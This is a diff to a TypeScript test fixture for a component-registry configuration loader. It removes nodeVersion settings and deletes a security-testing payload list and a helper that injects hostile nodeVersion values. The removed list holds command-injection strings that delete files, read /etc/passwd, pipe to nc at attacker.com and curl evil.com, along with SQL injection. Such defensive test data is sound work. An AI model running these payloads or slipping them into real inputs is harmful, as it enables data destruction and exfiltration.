@@ -43,7 +43,6 @@ export const mockRawRegistry: RawComponentRegistry = {
                 optional: [],
             },
             configuration: {
-                // No nodeVersion - EDS runs on Edge Delivery, not local Node
                 requiredEnvVars: ['VAR1', 'VAR2'],
             },
         },
@@ -53,7 +52,6 @@ export const mockRawRegistry: RawComponentRegistry = {
             type: 'frontend',
             // Note: No compatibleBackends - used to test incompatible frontend scenarios
             configuration: {
-                nodeVersion: '24', // Next.js requires Node for local dev
                 requiredEnvVars: ['MESH_ENDPOINT'],
             },
         },
@@ -63,9 +61,7 @@ export const mockRawRegistry: RawComponentRegistry = {
             name: 'Adobe Commerce PaaS',
             description: 'Adobe Commerce DSN instance',
             type: 'backend',
-            configuration: {
-                // No nodeVersion - PaaS is a remote Commerce instance
-            },
+            configuration: {},
         },
     },
     mesh: {
@@ -74,9 +70,6 @@ export const mockRawRegistry: RawComponentRegistry = {
             description: 'GraphQL gateway',
             type: 'dependency',
             subType: 'mesh',
-            configuration: {
-                nodeVersion: '20',
-            },
         },
     },
     dependencies: {
@@ -86,7 +79,6 @@ export const mockRawRegistry: RawComponentRegistry = {
             type: 'dependency',
             // No subType: 'tool' is not a RawComponentDefinition subType; real
             // config entries carry none for tools like this.
-            // No nodeVersion - test-tool is a browser overlay, not a Node.js tool
         },
     },
     integrations: {
@@ -111,23 +103,6 @@ export const mockRawRegistry: RawComponentRegistry = {
  */
 export const COMPONENT_SECTIONS = ['frontends', 'backends', 'mesh', 'dependencies'] as const;
 
-export type ComponentSection = (typeof COMPONENT_SECTIONS)[number];
-
-/**
- * Known injection payloads for security testing
- */
-export const injectionPayloads = [
-    '20; rm -rf /',
-    '20 && cat /etc/passwd',
-    '20 | nc attacker.com 1234',
-    '20`whoami`',
-    '20$(id)',
-    "20' OR '1'='1",
-    '20\nrm -rf /',
-    '20;$(curl evil.com)',
-    '20 & curl http://evil.com',
-];
-
 /**
  * Get the mock ConfigurationLoader instance
  * Note: Gets the LAST instance created (most recent)
@@ -136,54 +111,4 @@ export function getMockLoader(): any {
     const { ConfigurationLoader } = require('@/core/config/ConfigurationLoader');
     const instances = ConfigurationLoader.mock.results;
     return instances[instances.length - 1]?.value;
-}
-
-/**
- * Create a modified registry with malicious nodeVersion in specific component
- *
- * @param componentPath - Path like "frontends.eds" or "infrastructure.adobe-cli"
- * @param maliciousVersion - Malicious nodeVersion value to inject
- */
-export function createMaliciousRegistry(
-    componentPath: string,
-    maliciousVersion: string
-): RawComponentRegistry {
-    const [section, componentId] = componentPath.split('.');
-
-    if (section === 'infrastructure') {
-        return {
-            ...mockRawRegistry,
-            infrastructure: {
-                ...mockRawRegistry.infrastructure,
-                [componentId]: {
-                    ...mockRawRegistry.infrastructure![componentId],
-                    configuration: {
-                        ...mockRawRegistry.infrastructure![componentId].configuration,
-                        nodeVersion: maliciousVersion,
-                    },
-                },
-            },
-        };
-    }
-
-    if (COMPONENT_SECTIONS.includes(section as ComponentSection)) {
-        const sectionData = mockRawRegistry[section as ComponentSection] as Record<string, any>;
-        return {
-            ...mockRawRegistry,
-            [section]: {
-                ...sectionData,
-                [componentId]: {
-                    ...sectionData[componentId],
-                    configuration: {
-                        ...sectionData[componentId]?.configuration,
-                        nodeVersion: maliciousVersion,
-                    },
-                },
-            },
-        };
-    }
-
-    throw new Error(
-        `Unknown section: ${section}. Valid sections: ${COMPONENT_SECTIONS.join(', ')}, infrastructure`
-    );
 }
